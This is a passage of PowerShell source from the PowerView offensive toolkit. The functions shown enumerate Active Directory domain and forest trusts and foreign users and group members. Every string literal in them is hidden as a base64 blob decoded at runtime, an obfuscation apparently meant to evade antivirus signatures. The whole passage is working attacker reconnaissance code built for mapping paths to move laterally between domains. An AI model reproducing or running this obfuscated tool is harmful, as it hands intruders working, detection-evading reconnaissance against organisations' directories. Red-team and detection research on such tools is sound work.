    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,
        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $TrustAttributes = @{
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMQA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAE4AXwBUAFIAQQBOAFMASQBUAEkAVgBFAA==')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMgA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBQAEwARQBWAEUATABfAE8ATgBMAFkA')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAANAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBJAEwAVABFAFIAXwBTAEkARABTAA==')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAOAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBPAFIARQBTAFQAXwBUAFIAQQBOAFMASQBUAEkAVgBFAA==')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADEAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBSAE8AUwBTAF8ATwBSAEcAQQBOAEkAWgBBAFQASQBPAE4A')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADIAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBJAFQASABJAE4AXwBGAE8AUgBFAFMAVAA=')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADQAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAEUAQQBUAF8AQQBTAF8ARQBYAFQARQBSAE4AQQBMAA==')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADgAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAFUAUwBUAF8AVQBTAEUAUwBfAFIAQwA0AF8ARQBOAEMAUgBZAFAAVABJAE8ATgA=')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAxADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAFUAUwBUAF8AVQBTAEUAUwBfAEEARQBTAF8ASwBFAFkAUwA=')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAyADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBSAE8AUwBTAF8ATwBSAEcAQQBOAEkAWgBBAFQASQBPAE4AXwBOAE8AXwBUAEcAVABfAEQARQBMAEUARwBBAFQASQBPAE4A')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAA0ADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABJAE0AXwBUAFIAVQBTAFQA')))
        }
        $LdapSearcherArguments = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $LdapSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { $LdapSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { $LdapSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { $LdapSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $LdapSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $LdapSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $LdapSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $LdapSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $LdapSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $LdapSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PsCmdlet.ParameterSetName -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAEkA')))) {
            $NetSearcherArguments = @{}
            if ($Domain -and $Domain.Trim() -ne '') {
                $SourceDomain = $Domain
            }
            else {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                    $SourceDomain = (Get-Domain -Credential $Credential).Name
                }
                else {
                    $SourceDomain = (Get-Domain).Name
                }
            }
        }
        elseif ($PsCmdlet.ParameterSetName -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBFAFQA')))) {
            if ($Domain -and $Domain.Trim() -ne '') {
                $SourceDomain = $Domain
            }
            else {
                $SourceDomain = $Env:USERDNSDOMAIN
            }
        }
        if ($PsCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA=')))) {
            $TrustSearcher = Get-DomainSearcher @LdapSearcherArguments
            $SourceSID = Get-DomainSID @NetSearcherArguments
            if ($TrustSearcher) {
                $TrustSearcher.Filter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQB0AHIAdQBzAHQAZQBkAEQAbwBtAGEAaQBuACkA')))
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { $Results = $TrustSearcher.FindOne() }
                else { $Results = $TrustSearcher.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    $Props = $_.Properties
                    $DomainTrust = New-Object PSObject
                    $TrustAttrib = @()
                    $TrustAttrib += $TrustAttributes.Keys | Where-Object { $Props.trustattributes[0] -band $_ } | ForEach-Object { $TrustAttributes[$_] }
                    $Direction = Switch ($Props.trustdirection) {
                        0 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYQBiAGwAZQBkAA=='))) }
                        1 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGIAbwB1AG4AZAA='))) }
                        2 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAYgBvAHUAbgBkAA=='))) }
                        3 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBpAGQAaQByAGUAYwB0AGkAbwBuAGEAbAA='))) }
                    }
                    $TrustType = Switch ($Props.trusttype) {
                        1 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBJAE4ARABPAFcAUwBfAE4ATwBOAF8AQQBDAFQASQBWAEUAXwBEAEkAUgBFAEMAVABPAFIAWQA='))) }
                        2 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBJAE4ARABPAFcAUwBfAEEAQwBUAEkAVgBFAF8ARABJAFIARQBDAFQATwBSAFkA'))) }
                        3 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBJAFQA'))) }
                    }
                    $Distinguishedname = $Props.distinguishedname[0]
                    $SourceNameIndex = $Distinguishedname.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))
                    if ($SourceNameIndex) {
                        $SourceDomain = $($Distinguishedname.SubString($SourceNameIndex)) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                    }
                    else {
                        $SourceDomain = ""
                    }
                    $TargetNameIndex = $Distinguishedname.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LABDAE4APQBTAHkAcwB0AGUAbQA='))))
                    if ($SourceNameIndex) {
                        $TargetDomain = $Distinguishedname.SubString(3, $TargetNameIndex-3)
                    }
                    else {
                        $TargetDomain = ""
                    }
                    $ObjectGuid = New-Object Guid @(,$Props.objectguid[0])
                    $TargetSID = (New-Object System.Security.Principal.SecurityIdentifier($Props.securityidentifier[0],0)).Value
                    $DomainTrust | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUATgBhAG0AZQA='))) $SourceDomain
                    $DomainTrust | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQATgBhAG0AZQA='))) $Props.name[0]
                    $DomainTrust | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AFQAeQBwAGUA'))) $TrustType
                    $DomainTrust | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AEEAdAB0AHIAaQBiAHUAdABlAHMA'))) $($TrustAttrib -join ',')
                    $DomainTrust | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AEQAaQByAGUAYwB0AGkAbwBuAA=='))) "$Direction"
                    $DomainTrust | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBoAGUAbgBDAHIAZQBhAHQAZQBkAA=='))) $Props.whencreated[0]
                    $DomainTrust | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBoAGUAbgBDAGgAYQBuAGcAZQBkAA=='))) $Props.whenchanged[0]
                    $DomainTrust.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAG8AbQBhAGkAbgBUAHIAdQBzAHQALgBMAEQAQQBQAA=='))))
                    $DomainTrust
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose "[Get-DomainTrust] Error disposing of the Results object: $_"
                    }
                }
                $TrustSearcher.dispose()
            }
        }
        elseif ($PsCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAEkA')))) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) {
                $TargetDC = $Server
            }
            elseif ($Domain -and $Domain.Trim() -ne '') {
                $TargetDC = $Domain
            }
            else {
                $TargetDC = $Null
            }
            $PtrInfo = [IntPtr]::Zero
            $Flags = 63
            $DomainCount = 0
            $Result = $Netapi32::DsEnumerateDomainTrusts($TargetDC, $Flags, [ref]$PtrInfo, [ref]$DomainCount)
            $Offset = $PtrInfo.ToInt64()
            if (($Result -eq 0) -and ($Offset -gt 0)) {
                $Increment = $DS_DOMAIN_TRUSTS::GetSize()
                for ($i = 0; ($i -lt $DomainCount); $i++) {
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $DS_DOMAIN_TRUSTS
                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment
                    $SidString = ''
                    $Result = $Advapi32::ConvertSidToStringSid($Info.DomainSid, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                    if ($Result -eq 0) {
                        Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                    }
                    else {
                        $DomainTrust = New-Object PSObject
                        $DomainTrust | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUATgBhAG0AZQA='))) $SourceDomain
                        $DomainTrust | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQATgBhAG0AZQA='))) $Info.DnsDomainName
                        $DomainTrust | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQATgBlAHQAYgBpAG8AcwBOAGEAbQBlAA=='))) $Info.NetbiosDomainName
                        $DomainTrust | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))) $Info.Flags
                        $DomainTrust | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAZQBuAHQASQBuAGQAZQB4AA=='))) $Info.ParentIndex
                        $DomainTrust | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AFQAeQBwAGUA'))) $Info.TrustType
                        $DomainTrust | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AEEAdAB0AHIAaQBiAHUAdABlAHMA'))) $Info.TrustAttributes
                        $DomainTrust | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBpAGQA'))) $SidString
                        $DomainTrust | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQARwB1AGkAZAA='))) $Info.DomainGuid
                        $DomainTrust.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAG8AbQBhAGkAbgBUAHIAdQBzAHQALgBBAFAASQA='))))
                        $DomainTrust
                    }
                }
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
        else {
            $FoundDomain = Get-Domain @NetSearcherArguments
            if ($FoundDomain) {
                $FoundDomain.GetAllTrustRelationships() | ForEach-Object {
                    $_.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAG8AbQBhAGkAbgBUAHIAdQBzAHQALgBOAEUAVAA='))))
                    $_
                }
            }
        }
    }
}
function Get-ForestTrust {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForestTrust.NET')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $NetForestArguments = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) { $NetForestArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))] = $Forest }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $NetForestArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $FoundForest = Get-Forest @NetForestArguments
        if ($FoundForest) {
            $FoundForest.GetAllTrustRelationships() | ForEach-Object {
                $_.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBGAG8AcgBlAHMAdABUAHIAdQBzAHQALgBOAEUAVAA='))))
                $_
            }
        }
    }
}
function Get-DomainForeignUser {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $SearcherArguments = @{}
        $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABtAGUAbQBiAGUAcgBvAGYAPQAqACkA')))
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $Raw }
    }
    PROCESS {
        Get-DomainUser @SearcherArguments  | ForEach-Object {
            ForEach ($Membership in $_.memberof) {
                $Index = $Membership.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))
                if ($Index) {
                    $GroupDomain = $($Membership.SubString($Index)) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                    $UserDistinguishedName = $_.distinguishedname
                    $UserIndex = $UserDistinguishedName.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))
                    $UserDomain = $($_.distinguishedname.SubString($UserIndex)) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                    if ($GroupDomain -ne $UserDomain) {
                        $GroupName = $Membership.Split(',')[0].split('=')[1]
                        $ForeignUser = New-Object PSObject
                        $ForeignUser | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) $UserDomain
                        $ForeignUser | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) $_.samaccountname
                        $ForeignUser | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAE4AYQBtAGUA'))) $_.distinguishedname
                        $ForeignUser | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAbwBtAGEAaQBuAA=='))) $GroupDomain
                        $ForeignUser | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) $GroupName
                        $ForeignUser | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQATgBhAG0AZQA='))) $Membership
                        $ForeignUser.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBGAG8AcgBlAGkAZwBuAFUAcwBlAHIA'))))
                        $ForeignUser
                    }
                }
            }
        }
    }
}
function Get-DomainForeignGroupMember {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignGroupMember')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $SearcherArguments = @{}
        $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABtAGUAbQBiAGUAcgA9ACoAKQA=')))
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
